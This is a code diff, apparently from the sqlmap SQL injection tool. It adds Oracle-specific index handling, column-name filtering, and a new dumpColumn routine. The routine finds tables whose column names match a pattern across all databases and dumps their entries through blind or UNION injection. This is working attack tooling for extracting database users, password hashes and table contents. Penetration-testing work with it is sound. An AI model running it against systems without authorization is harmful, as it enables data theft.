@@ -190,7 +190,11 @@ class Enumeration:
                 errMsg = "unable to retrieve the number of database users"
                 raise sqlmapNoneDataException, errMsg
 
-            indexRange = getRange(count)
+            if kb.dbms == "Oracle":
+                plusOne = True
+            else:
+                plusOne = False
+            indexRange = getRange(count, plusOne=plusOne)
 
             for index in indexRange:
                 if condition:
@@ -299,7 +303,12 @@ class Enumeration:
                 logger.info(infoMsg)
 
                 passwords  = []
-                indexRange = getRange(count)
+
+                if kb.dbms == "Oracle":
+                    plusOne = True
+                else:
+                    plusOne = False
+                indexRange = getRange(count, plusOne=plusOne)
 
                 for index in indexRange:
                     if kb.dbms == "Microsoft SQL Server":
@@ -543,7 +552,12 @@ class Enumeration:
                 logger.info(infoMsg)
 
                 privileges = set()
-                indexRange = getRange(count)
+
+                if kb.dbms == "Oracle":
+                    plusOne = True
+                else:
+                    plusOne = False
+                indexRange = getRange(count, plusOne=plusOne)
 
                 for index in indexRange:
                     if kb.dbms == "MySQL" and not kb.data.has_information_schema:
@@ -742,7 +756,12 @@ class Enumeration:
                     continue
 
                 tables     = []
-                indexRange = getRange(count)
+
+                if kb.dbms in ( "Microsoft SQL Server", "Oracle" ):
+                    plusOne = True
+                else:
+                    plusOne = False
+                indexRange = getRange(count, plusOne=plusOne)
 
                 for index in indexRange:
                     query = rootQuery["blind"]["query"] % (db, index)
@@ -785,12 +804,23 @@ class Enumeration:
 
             conf.db = self.getCurrentDb()
 
-        infoMsg  = "fetching columns "
+        rootQuery = queries[kb.dbms].columns
+
+        infoMsg = "fetching columns "
+
+        if conf.col:
+            if kb.dbms == "Oracle":
+                conf.col = conf.col.upper()
+            colList = conf.col.split(",")
+            condition = rootQuery["blind"]["condition"]
+            condQuery = " AND (" + " OR ".join("%s LIKE '%s'" % (condition, "%" + col + "%") for col in colList) + ")"
+            infoMsg += "like '%s' " % ", ".join(col for col in colList)
+        else:
+            condQuery = ""
+
         infoMsg += "for table '%s' " % conf.tbl
         infoMsg += "on database '%s'" % conf.db
         logger.info(infoMsg)
-
-        rootQuery = queries[kb.dbms].columns
 
         if kb.unionPosition:
             if kb.dbms in ( "MySQL", "PostgreSQL" ):
@@ -798,18 +828,22 @@ class Enumeration:
             elif kb.dbms == "Oracle":
                 query = rootQuery["inband"]["query"] % conf.tbl.upper()
             elif kb.dbms == "Microsoft SQL Server":
+                # TODO: adjust with condQuery
                 query = rootQuery["inband"]["query"] % (conf.db, conf.db,
                                                         conf.db, conf.db,
                                                         conf.db, conf.db,
                                                         conf.db, conf.tbl)
 
+            query += condQuery
             value = inject.getValue(query, blind=False)
 
             if value:
                 table = {}
                 columns = {}
+
                 for column, colType in value:
                     columns[column] = colType
+
                 table[conf.tbl] = columns
                 kb.data.cachedColumns[conf.db] = table
 
@@ -824,8 +858,10 @@ class Enumeration:
             elif kb.dbms == "Oracle":
                 query = rootQuery["blind"]["count"] % conf.tbl.upper()
             elif kb.dbms == "Microsoft SQL Server":
+                # TODO: adjust with condQuery
                 query = rootQuery["blind"]["count"] % (conf.db, conf.db, conf.tbl)
 
+            query += condQuery
             count = inject.getValue(query, inband=False, expected="int", charsetType=2)
 
             if not count.isdigit() or not len(count) or count == "0":
@@ -834,24 +870,27 @@ class Enumeration:
                 errMsg += "on database '%s'" % conf.db
                 raise sqlmapNoneDataException, errMsg
 
+            table   = {}
+            columns = {}
+
             if kb.dbms == "Microsoft SQL Server":
                 plusOne = True
             else:
                 plusOne = False
-
-            table      = {}
-            columns    = {}
             indexRange = getRange(count, plusOne=plusOne)
 
             for index in indexRange:
                 if kb.dbms in ( "MySQL", "PostgreSQL" ):
-                    query = rootQuery["blind"]["query"] % (conf.tbl, conf.db, index)
+                    query = rootQuery["blind"]["query"] % (conf.tbl, conf.db)
                 elif kb.dbms == "Oracle":
-                    query = rootQuery["blind"]["query"] % (conf.tbl.upper(), index)
+                    query = rootQuery["blind"]["query"] % (conf.tbl.upper())
                 elif kb.dbms == "Microsoft SQL Server":
+                    # TODO: adjust with condQuery
                     query = rootQuery["blind"]["query"] % (index, conf.db,
                                                            conf.db, conf.tbl)
 
+                query += condQuery
+                query = agent.limitQuery(index, query)
                 column = inject.getValue(query, inband=False)
 
                 if not onlyColNames:
@@ -881,10 +920,274 @@ class Enumeration:
 
         return kb.data.cachedColumns
 
-    def dumpTable(self):
-        if not conf.tbl:
-            errMsg = "missing table parameter"
+    def dumpColumn(self):
+        # TODO: adjust for MSSQL
+
+        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
+            errMsg  = "information_schema not available, "
+            errMsg += "back-end DBMS is MySQL < 5.0"
+            raise sqlmapUnsupportedFeatureException, errMsg
+
+        if not conf.col:
+            errMsg = "missing column parameter"
             raise sqlmapMissingMandatoryOptionException, errMsg
+
+        rootQuery = queries[kb.dbms].dumpColumn
+        foundCols = {}
+        dbs = {}
+        colList = conf.col.split(",")
+        colCond = rootQuery["inband"]["condition"]
+        dbCond = rootQuery["inband"]["condition2"]
+
+        message = "do you want sqlmap to consider provided column(s):\n"
+        message += "[1] as LIKE column names (default)\n"
+        message += "[2] as exact column names"
+        colConsider = readInput(message, default="1")
+
+        if not colConsider or colConsider.isdigit() and colConsider == "1":
+            colConsider = "1"
+            colCondParam = " LIKE '%%%s%%'"
+        elif colConsider.isdigit() and colConsider == "2":
+            colCondParam = "='%s'"
+        else:
+            errMsg = "invalid value"
+            raise sqlmapNoneDataException, errMsg
+
+        if kb.dbms == "Microsoft SQL Server":
+            plusOne = True
+        else:
+            plusOne = False
+
+        for column in colList:
+            if kb.dbms == "Oracle":
+                column = column.upper()
+                conf.db = "USERS"
+
+            foundCols[column] = {}
+
+            if conf.db:
+                for db in conf.db.split(","):
+                    dbs[db] = {}
+                    foundCols[column][db] = []
+
+                continue
+
+            infoMsg = "fetching databases with tables containing column"
+            if colConsider == "1":
+                infoMsg += "s like"
+            infoMsg += " '%s'" % column
+            logger.info(infoMsg)
+
+            if conf.excludeSysDbs and kb.dbms != "Oracle":
+                dbsQuery = "".join(" AND '%s' != %s" % (db, dbCond) for db in self.excludeDbsList)
+                infoMsg = "skipping system databases '%s'" % ", ".join(db for db in self.excludeDbsList)
+                logger.info(infoMsg)
+            else:
+                dbsQuery = ""
+
+            colQuery = "%s%s" % (colCond, colCondParam)
+            colQuery = colQuery % column
+
+            if kb.unionPosition:
+                query = rootQuery["inband"]["query"]
+                query += colQuery
+                query += dbsQuery
+                values = inject.getValue(query, blind=False)
+
+                if values:
+                    if isinstance(values, str):
+                        values = [ values ]
+
+                    for value in values:
+                        dbs[value] = {}
+                        foundCols[column][value] = []
+            else:
+                infoMsg = "fetching number of databases with tables containing column"
+                if colConsider == "1":
+                    infoMsg += "s like"
+                infoMsg += " '%s'" % column
+                logger.info(infoMsg)
+
+                query = rootQuery["blind"]["count"]
+                query += colQuery
+                query += dbsQuery
+                count = inject.getValue(query, inband=False, expected="int", charsetType=2)
+
+                if not count.isdigit() or not len(count) or count == "0":
+                    warnMsg  = "no databases have tables containing column"
+                    if colConsider == "1":
+                        warnMsg += "s like"
+                    warnMsg += " '%s'" % column
+                    logger.warn(warnMsg)
+
+                    continue
+
+                indexRange = getRange(count, plusOne=plusOne)
+
+                for index in indexRange:
+                    query = rootQuery["blind"]["query"]
+                    query += colQuery
+                    query += dbsQuery
+                    query = agent.limitQuery(index, query)
+                    db = inject.getValue(query, inband=False)
+                    dbs[db] = {}
+                    foundCols[column][db] = []
+
+        for column, dbData in foundCols.items():
+            colQuery = "%s%s" % (colCond, colCondParam)
+            colQuery = colQuery % column
+
+            for db in dbData:
+                infoMsg = "fetching tables containing column"
+                if colConsider == "1":
+                    infoMsg += "s like"
+                infoMsg += " '%s' in database '%s'" % (column, db)
+                logger.info(infoMsg)
+
+                if kb.unionPosition:
+                    query = rootQuery["inband"]["query2"]
+                    if kb.dbms == "Oracle":
+                        query += " WHERE %s" % colQuery
+                    else:
+                        query = query % db
+                        query += " AND %s" % colQuery
+                    values = inject.getValue(query, blind=False)
+
+                    if values:
+                        if isinstance(values, str):
+                            values = [ values ]
+
+                        for value in values:
+                            if value not in dbs[db]:
+                                dbs[db][value] = {}
+
+                            dbs[db][value][column] = None
+                            foundCols[column][db].append(value)
+                else:
+                    infoMsg = "fetching number of tables containing column"
+                    if colConsider == "1":
+                        infoMsg += "s like"
+                    infoMsg += " '%s' in database '%s'" % (column, db)
+                    logger.info(infoMsg)
+
+                    query = rootQuery["blind"]["count2"]
+                    if kb.dbms == "Oracle":
+                        query += " WHERE %s" % colQuery
+                    else:
+                        query = query % db
+                        query += " AND %s" % colQuery
+                    count = inject.getValue(query, inband=False, expected="int", charsetType=2)
+
+                    if not count.isdigit() or not len(count) or count == "0":
+                        warnMsg = "no tables contain column"
+                        if colConsider == "1":
+                            warnMsg += "s like"
+                        warnMsg += " '%s'" % column
+                        warnMsg += "in database '%s'" % db
+                        logger.warn(warnMsg)
+
+                        continue
+
+                    indexRange = getRange(count, plusOne=plusOne)
+
+                    for index in indexRange:
+                        query = rootQuery["blind"]["query2"]
+                        if kb.dbms == "Oracle":
+                            query += " WHERE %s" % colQuery
+                        else:
+                            query = query % db
+                            query += " AND %s" % colQuery
+                        query = agent.limitQuery(index, query)
+                        tbl = inject.getValue(query, inband=False)
+
+                        if tbl not in dbs[db]:
+                            dbs[db][tbl] = {}
+
+                        dbs[db][tbl][column] = None
+                        foundCols[column][db].append(tbl)
+
+        if colConsider == "1":
+            okDbs = {}
+
+            for db, tableData in dbs.items():
+                conf.db = db
+                okDbs[db] = {}
+
+                for tbl, columns in tableData.items():
+                    conf.tbl = tbl
+
+                    for column in columns:
+                        conf.col = column
+
+                        self.getColumns(onlyColNames=True)
+
+                        if tbl in okDbs[db]:
+                            okDbs[db][tbl].update(kb.data.cachedColumns[db][tbl])
+                        else:
+                            okDbs[db][tbl] = kb.data.cachedColumns[db][tbl]
+
+                        kb.data.cachedColumns = {}
+
+            dbs = okDbs
+
+        if not dbs:
+            warnMsg = "no databases have tables containing any of the "
+            warnMsg += "provided columns"
+            logger.warn(warnMsg)
+            return
+
+        dumper.dbColumns(foundCols, colConsider, dbs)
+
+        message = "do you want to dump entries? [Y/n] "
+        output = readInput(message, default="Y")
+
+        if output not in ("y", "Y"):
+            return
+
+        dumpFromDbs = []
+        message = "which database?\n[a]ll (default)\n"
+
+        for db in dbs:
+            message += "[%s]\n" % db
+
+        message += "[q]uit"
+        test = readInput(message, default="a")
+
+        if not test or test[0] in ("a", "A"):
+            dumpFromDbs = dbs.keys()
+
+        elif test[0] in ("q", "Q"):
+            return
+
+        else:
+            dumpFromDbs = test.replace(" ", "").split(",")
+
+        for db, tblData in dbs.items():
+            if db not in dumpFromDbs:
+                continue
+
+            conf.db = db
+
+            for table, columns in tblData.items():
+                conf.tbl = table
+                conf.col = ",".join(column for column in columns)
+                kb.data.cachedColumns = {}
+                kb.data.dumpedTable = {}
+
+                data = self.dumpTable()
+
+                if data:
+                    dumper.dbTableValues(data)
+
+    def dumpTable(self):
+        if not conf.tbl and not conf.col:
+            errMsg = "missing both table and column parameters, please "
+            errMsg += "provide at least one of them"
+            raise sqlmapMissingMandatoryOptionException, errMsg
+
+        if conf.col and not conf.tbl:
+            self.dumpColumn()
+            return
 
         if "." in conf.tbl:
             conf.db, conf.tbl = conf.tbl.split(".")
@@ -926,6 +1229,8 @@ class Enumeration:
         infoMsg += " on database '%s'" % conf.db
         logger.info(infoMsg)
 
+        entriesCount = 0
+
         if kb.unionPosition:
             if kb.dbms == "Oracle":
                 query = rootQuery["inband"]["query"] % (colString, conf.tbl.upper())
@@ -934,6 +1239,9 @@ class Enumeration:
             entries = inject.getValue(query, blind=False)
 
             if entries:
+                if isinstance(entries, str):
+                    entries = [ entries ]
+
                 entriesCount = len(entries)
                 index        = 0
 
@@ -974,17 +1282,15 @@ class Enumeration:
             count = inject.getValue(query, inband=False, expected="int", charsetType=2)
 
             if not count.isdigit() or not len(count) or count == "0":
-                errMsg = "unable to retrieve the number of "
+                warnMsg = "unable to retrieve the number of "
                 if conf.col:
-                    errMsg += "columns '%s' " % colString
-                errMsg += "entries for table '%s' " % conf.tbl
-                errMsg += "on database '%s'" % conf.db
+                    warnMsg += "columns '%s' " % colString
+                warnMsg += "entries for table '%s' " % conf.tbl
+                warnMsg += "on database '%s'" % conf.db
 
-                if conf.dumpAll:
-                    logger.warn(errMsg)
-                    return None
-                else:
-                    raise sqlmapNoneDataException, errMsg
+                logger.warn(warnMsg)
+
+                return None
 
             lengths    = {}
             entries    = {}
@@ -1036,17 +1342,15 @@ class Enumeration:
                                               "db":    conf.db
                                             }
         else:
-            errMsg = "unable to retrieve the entries of "
+            warnMsg = "unable to retrieve the entries of "
             if conf.col:
-                errMsg += "columns '%s' " % colString
-            errMsg += "for table '%s' " % conf.tbl
-            errMsg += "on database '%s'" % conf.db
+                warnMsg += "columns '%s' " % colString
+            warnMsg += "for table '%s' " % conf.tbl
+            warnMsg += "on database '%s'" % conf.db
 
-            if conf.dumpAll:
-                logger.warn(errMsg)
-                return None
-            else:
-                raise sqlmapNoneDataException, errMsg
+            logger.warn(warnMsg)
+
+            return None
 
         return kb.data.dumpedTable
 
